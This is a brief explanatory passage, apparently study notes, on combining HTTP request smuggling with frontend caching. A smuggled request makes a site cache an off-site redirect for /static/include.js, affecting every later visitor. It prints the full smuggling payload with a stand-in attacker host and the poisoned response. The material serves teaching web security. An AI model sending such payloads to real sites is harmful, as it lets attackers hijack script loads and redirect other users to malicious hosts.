It is a variation of "Using HTTP request smuggling to turn an on-site redirect into an open redirect" and happens if any part of the frontend performs caching of content (mostly for performance reasons).

This case makes the attack persistent, and affects any user who subsequently requests the affected URL.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

So in this scenario the smuggled request reaches the backend which responds with an off-site redirect, and the frontend caches this response against what it believes is the URL in the second request, which is /static/include.js:

```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

Then from this point, when the user request this URL, they receive the redirection to the attacker's web site.
